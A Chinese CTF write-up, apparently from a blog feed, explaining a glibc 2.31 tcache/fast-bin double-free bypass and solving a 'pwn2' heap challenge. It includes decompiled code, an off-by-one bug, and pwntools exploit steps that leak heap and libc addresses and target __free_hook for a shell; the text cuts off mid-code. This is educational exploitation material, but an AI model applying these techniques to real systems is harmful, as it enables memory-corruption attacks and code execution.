      <link href="/2021/09/03/tcache%E4%B8%AD%E7%9A%84double-free/"/>
      <url>/2021/09/03/tcache%E4%B8%AD%E7%9A%84double-free/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  第一次参加组内月赛，借这个机会正好熟悉一下<strong>glibc2.31</strong>下的tcache攻击的相关套路</p><h1 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h1><p>  相比较前面，<strong>tcache</strong>增加了如下代码，检查可能的<strong>double free</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>  可以看到，这里会判断<strong>tcache</strong>的<strong>key</strong>字段的值。而每一个被释放的<strong>tcache</strong>，其<strong>key</strong>都会按照如下代码，被设置为固定的值，从而尽可能避免了<strong>double free</strong><br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  因此，这里没有办法轻易的使用<strong>double free</strong>——<strong>free</strong>的chunk大小只要在<strong>tcache</strong>的范围之内，都会首先以<strong>tcache</strong>的方式进行释放，也就是会检查这个字段(<strong>tc<em>idx &lt; mp</em>.tcache_bins</strong>的条件一般总是满足的)，总而导致无法方便的<strong>double free</strong></p><h1 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h1><p>  目前绕过的策略是利用<strong>fast bin</strong>和<strong>tcache</strong>，共同完成<strong>double free</strong>攻击<br>  如果我们想要完成<strong>victim</strong>内存块的<strong>double free</strong>攻击，其基本策略如下所示：</p><ol><li>首先任意释放7个与<strong>victim</strong>相同大小的chunk，从而将对应的<strong>tcache</strong>填充满，如下图所示<br><img src="tcache填充满.PNG" alt="tcache填充满"></li><li>将<strong>victim</strong>内存块释放掉。由于<strong>tcache</strong>已经满了，则其会被释放到对应大小的<strong>fast bin</strong>链上，如下图所示<br><img src="释放victim.PNG" alt="释放victim"></li><li>申请一个与<strong>victim</strong>相同大小的chunk。根据<strong>malloc</strong>的分配流程，其会首先从<strong>tcache</strong>中进行申请，然后再去查找<strong>fast bin</strong>。因此这里会分配前面的<strong>chunk1</strong>，如下图所示<br><img src="重新申请内存.PNG" alt="重新申请内存"></li><li><p>重新释放<strong>victim</strong>内存块。由于之前<strong>tcache</strong>中没有释放过<strong>victim</strong>，则可以正常释放；但是<strong>fast bin</strong>中已经有<strong>victim</strong>内存块，则完成了<strong>double free</strong>，如下图所示<br><img src="再次释放victim.PNG" alt="再次释放victim"></p><p>之后一般的利用方式就是普通的<strong>double free</strong><br>可以通过申请<strong>victim</strong>内存并修改其上的数据，从而修改掉<strong>fast bin</strong>的链表指向。</p></li></ol><h1 id="实例-pwn2"><a href="#实例-pwn2" class="headerlink" title="实例 pwn2"></a>实例 pwn2</h1><p>  点击<a href="pwn2.tar.gz">附件链接</a>下载文件</p><h2 id="保护分析"><a href="#保护分析" class="headerlink" title="保护分析"></a>保护分析</h2><p>  首先我们简单的查看一下程序相关的保护机制<br>  <img src="保护机制.PNG" alt="保护机制"></p><p>  可以看到，基本上所有保护都全部开启，那么基本上可以猜测，这是一道菜单堆的题目</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>  我们首先介绍一下程序的逻辑结构。<br>  整个程序主要分为三个逻辑块，创建note、删除note和输出note信息。</p><p>  其创建note的程序逻辑如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Full!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_4068 + <span class="number">8</span> * (__int64)i) || *((_DWORD *)&amp;notes + <span class="number">16</span> * (__int64)i) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  size = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too big!&quot;</span>);</span><br><span class="line">  *((_QWORD *)&amp;unk_4068 + <span class="number">8</span> * (__int64)i) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="built_in">memset</span>(*((<span class="type">void</span> **)&amp;unk_4068 + <span class="number">8</span> * (__int64)i), <span class="number">0</span>, size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note: &quot;</span>);</span><br><span class="line">  read_input(*((_QWORD *)&amp;unk_4068 + <span class="number">8</span> * (__int64)i), size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Description of this note: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%48s&quot;</span>, (<span class="type">char</span> *)&amp;notes + <span class="number">64</span> * (__int64)i + <span class="number">16</span>);</span><br><span class="line">  *((_DWORD *)&amp;notes + <span class="number">16</span> * (__int64)i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  实际上，这里有一个很明显的溢出漏洞(实际上我一开始不太确认，还在电脑上简单测试了一下)——<code>__isoc99_scanf(&quot;%48s&quot;, (char *)&amp;notes + 64 * (__int64)i + 16);</code>这一行代码，其限制了48个字符，但是字符串结尾的<code>\x00</code>没有计算在内，这实际上会覆盖掉<code>((_DWORD *)&amp;notes + 16 * (__int64)i)</code></p><p>  对于删除note的程序逻辑，其如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which note do you want to delete?\nIndex: &quot;</span>);</span><br><span class="line">  v2 = (<span class="type">int</span>)read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_4068 + <span class="number">8</span> * v2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *((_DWORD *)&amp;notes + <span class="number">16</span> * v2) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Double free! Bad hacker :(&quot;</span>);</span><br><span class="line">        _exit(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_4068 + <span class="number">8</span> * v2));</span><br><span class="line">      v0 = &amp;notes;</span><br><span class="line">      *((_DWORD *)&amp;notes + <span class="number">16</span> * v2) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;No such note!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid index.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  并没有什么明显的漏洞。但是配合分配时的溢出漏洞，可以实现一个内存块的多次释放——即存在了<strong>double free</strong>的可能性</p><p>  最后对于输出note信息，其逻辑如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">list</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_4068 + <span class="number">8</span> * (__int64)i) &amp;&amp; !*((_DWORD *)&amp;notes + <span class="number">16</span> * (__int64)i) )</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;Note %d:\n  Data: %s\n  Desc: %s\n&quot;</span>,</span><br><span class="line">        (<span class="type">unsigned</span> <span class="type">int</span>)i,</span><br><span class="line">        *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_4068 + <span class="number">8</span> * (__int64)i),</span><br><span class="line">        (<span class="type">const</span> <span class="type">char</span> *)&amp;notes + <span class="number">64</span> * (__int64)i + <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_2078);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  类似于删除note，没有什么明显的漏洞，但是配合分配note时的溢出，可以打印被释放的内存上的相关信息——这是泄露<strong>libc</strong>基址的基础。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>  实际上，根据前面的漏洞分析，其大致的思路也很简单<br>  通过分配时的note溢出，从而构造<strong>double free</strong>，进而控制<strong>fast bin</strong>链的指向，替换为可控内存地址，分配该内存地址后，将其释放到<strong>unsorted bin</strong>中。再次利用分配时的note溢出，打印出<strong>unsorted bin</strong>中内存上的相关信息，从而泄露<strong>libc</strong>基址<br>  其次，由于我们有可控内存地址，则我们修改该值，从而覆盖掉释放的chunk，从而更改<strong>tcache</strong>链的指向，从而分配<code>__free_hook</code>附近的内存地址，并将其覆写成<code>system</code>的值，通过释放一个包含<code>/bin/bash</code>字段的内存对象，最终获取程序的<strong>shell</strong></p><p>  实际上，这里面还有较多的细节需要注意——其申请内存最多不超过<strong>0x78</strong>，即chunk大小为<strong>0x80</strong>，但是我们如何将其释放到<strong>unsorted bin</strong>中，这通常需要一些技巧，即在可控的连续内存对象上伪造一个内存对象，然后将其插入<strong>tcache</strong>或<strong>bin</strong>中。<br>  <img src="伪造chunk.PNG" alt="伪造chunk"></p><p>  这里简单介绍一下，为了避免申请/释放内存对我们伪造的内存块产生影响，则我们将伪造的chunk从正常chunk的<strong>SIZE_SZ * 2</strong>偏移处开始构造；一般使用都是通过<strong>double free</strong>插入空闲链表，然后申请后在进行释放，因此需要构造相应的环境通过检查(一个0x20的正在使用的pre chunk、两个0x20的正在使用的next chunk)，从而可以绕过各种检查，将该伪造的chunk当作正常的chunk使用。</p><p>  这样子，由于我们将chunk伪造在可控内存地址处，则伪造的chunk上的数据可以通过更改可控内存地址进行修改，从而修改空闲链的指向<br>  另一方面，由于往往伪造的chunk很大，会跨越多个正常的chunk，因此我们可以通过修改伪造chunk的数据，从而更改正常chunk上的值，也同样可以修改空闲链的指向</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>  最后，这里给出这个漏洞利用的具体实现和细节说明</p><p>  首先，我们的目标是伪造一个足够大的chunk(不在tcache的范围内，本题选择0x470)，从而释放可以直接释放到<strong>unsorted bin</strong>中。</p><ol><li>伪造一个大小是0x80的fake chunk，并将其通过<strong>double free</strong>插入到<strong>fast bin</strong>的空闲链上，绕过大小检查。并且将其申请出来。</li><li>通过修改fake chunk所在的chunk的数据，将fake chunk的大小更改为0x470，此时fake chunk仍在可控内存对象中，并且其为了绕过周边检查的环境已经铺垫好</li><li><p>将fake chunk释放掉，则会将其释放到<strong>unsorted bin</strong>的链上</p><p>由于我们会利用到<strong>double free</strong>，则我们首先按照前面的漏洞分析，构造一个<strong>double free</strong>的环境，如下代码所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak the chunk address</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#0 chunk_base</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#1 chunk_base + 0x80</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#2 chunk_base + 0x80 * 2</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#3 chunk_base + 0x80 * 3</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#4 chunk_base + 0x80 * 4</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#5 chunk_base + 0x80 * 5</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#6 chunk_base + 0x80 * 6</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#7 chunk_base + 0x80 * 7</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#8 chunk_base + 0x80 * 8</span></span><br><span class="line">node_add(r, <span class="number">0x78</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>), <span class="string">&#x27;a\n&#x27;</span>)     <span class="comment">#9 chunk_base + 0x80 * 9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">node_del(r, <span class="number">8</span>)</span><br><span class="line">node_del(r, <span class="number">7</span>)</span><br><span class="line">node_del(r, <span class="number">6</span>)</span><br><span class="line">node_del(r, <span class="number">5</span>)</span><br><span class="line">node_del(r, <span class="number">4</span>)</span><br><span class="line">node_del(r, <span class="number">3</span>)</span><br><span class="line">node_del(r, <span class="number">0</span>)                      <span class="comment">#tcache full</span></span><br><span class="line"></span><br><span class="line">node_del(r, <span class="number">9</span>)</span><br><span class="line">node_del(r, <span class="number">2</span>)</span><br><span class="line">node_del(r, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>此时内存中的布局如下所示<br><img src="内存布局1.PNG" alt="内存布局1"></p><p>如果我们要将伪造的chunk插入到空闲链上，首先需要知道chunk的地址。这个其实不是很困难——我们通过前面的溢出，会将<code>idx = 1</code>的chunk重新标明为未释放，则打印时会打印其内容，根据内存布局可知，会打印<strong>base + 0x80 * 2</strong>的值，从而我们可以获取<strong>base</strong>的值，即获取了整个内存布局的地址。<br>与此同时，我们在利用溢出的过程中，同时在<code>idx = 0</code>的chunk上构造对应的伪造chunk，为之后将该伪造chunk插入链表中做铺垫，代码如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">node_add(r, <span class="number">0x78</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>), <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)      <span class="comment">#0 chunk_base</span></span><br><span class="line">info = node_list(r).split(<span class="string">&#x27;Note 1:\n  Data: &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;\n  Desc: &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">chunk_base = u64(info.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x80</span> * <span class="number">2</span></span><br><span class="line">log.info(<span class="string">&#x27;chunk_base =&gt; %x&#x27;</span>%(chunk_base))</span><br></pre></td></tr></table></figure><p>此时，其内存布局如下所示<br><img src="内存布局2.PNG" alt="内存布局2"></p><p>可以看到，此时在<strong>base + 0x30</strong>上，已经有了一个fake chunk(其之后会更改大小，因此不需要在伪造前后chunk)，则下面我们只需要进行<strong>double free</strong>，并修改<strong>fast bin</strong>的指向即可——即释放<code>idx = 1</code>的chunk，如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node_del(r, <span class="number">1</span>)                      <span class="comment">#double free</span></span><br></pre></td></tr></table></figure><p>其内存布局已经构成<strong>double free</strong>的局面，如下所示<br><img src="内存布局3.PNG" alt="内存布局3"></p><p>此时，我们将fake chunk挂在<strong>fast bin</strong>的链上即可，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node_add(r, <span class="number">0x78</span>, p64(chunk_base + <span class="number">0x30</span>), <span class="string">&#x27;a\n&#x27;</span>)             <span class="comment">#1 chunk_base + 0x80</span></span><br></pre></td></tr></table></figure><p>其fake chunk已经被插入到<strong>fast bin</strong>链上，如下所示<br><img src="内存布局4.PNG" alt="内存布局4"></p><p>然后，需要将该fake chunk分配出来，并通过修改<strong>base</strong>对应的chunk数据，从而覆写fake chunk的大小，最后将其释放到<strong>unsorted bin</strong>中即可，相关代码如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)           <span class="comment">#2 chunk_base + 0x80 * 3 </span></span><br><span class="line"> node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)           <span class="comment">#3 chunk_base + 0x80 * 4</span></span><br><span class="line"> node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)           <span class="comment">#4 chunk_base + 0x80 * 5</span></span><br><span class="line"> node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)           <span class="comment">#5 chunk_base + 0x80 * 6</span></span><br><span class="line"> node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)           <span class="comment">#6 chunk_base + 0x80 * 7</span></span><br><span class="line"> node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)           <span class="comment">#7 chunk_base + 0x80 * 8        tcache empty</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a\n&#x27;</span>)           <span class="comment">#8 chunk_base + 0x80</span></span><br><span class="line"> node_add(r, <span class="number">0x78</span>, p64(<span class="number">0</span>) * ((<span class="number">0x80</span> - <span class="number">0x30</span> - <span class="number">0x10</span>) / <span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>), <span class="string">&#x27;a\n&#x27;</span>)           <span class="comment">#9 chunk_base + 0x30</span></span><br></pre></td></tr></table></figure><p>此时，<code>idx = 0</code>到<code>idx = 9</code>上都被分配了相关的chunk，此时一方面需要更改<strong>base</strong>对应的chunk数据，并重新覆写fake chunk大小；另一方面，需要将fake chunk释放到<strong>unsorted bin</strong>中，并且通过该值获取<strong>libc</strong>基址，代码如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">node_del(r, <span class="number">8</span>)                          <span class="comment">#to show unsorted_bin in index9</span></span><br><span class="line">node_del(r, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">node_add(r, <span class="number">0x78</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x471</span>), <span class="string">&#x27;a\n&#x27;</span>)    <span class="comment">#0 chunk_base                  change the chunk size in index8</span></span><br><span class="line">node_del(r, <span class="number">9</span>)</span><br><span class="line">node_add(r, <span class="number">0x78</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>)                                               <span class="comment">#8 chunk_base + 0x80       change the flag in index8</span></span><br><span class="line">info = node_list(r).split(<span class="string">&#x27;Note 9:\n  Data: &#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;\n  Desc: &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">lib_base = u64(info.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) + <span class="number">0x7fdb734b0000</span> - <span class="number">0x7fdb734a7be0</span></span><br><span class="line">log.info(<span class="string">&#x27;lib_base =&gt; %x&#x27;</span>%lib_base)</span><br></pre></td></tr></table></figure><p>此时其内存布局如下所示<br><img src="内存布局5.PNG" alt="内存布局5"></p><p>目前，我们已经获取了<strong>libc</strong>的基址了，并且我们可以通过修改fake chunk的值，从而覆盖其他正常<strong>tcache</strong>的值，从而修改<strong>tcache</strong>的链的指向，则我们只需要将<strong>__free_hook</strong>插入到<strong>tcache</strong>链上即可，代码如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">node_del(r, <span class="number">0</span>)</span><br><span class="line">node_add(r, <span class="number">0x78</span>, p64(<span 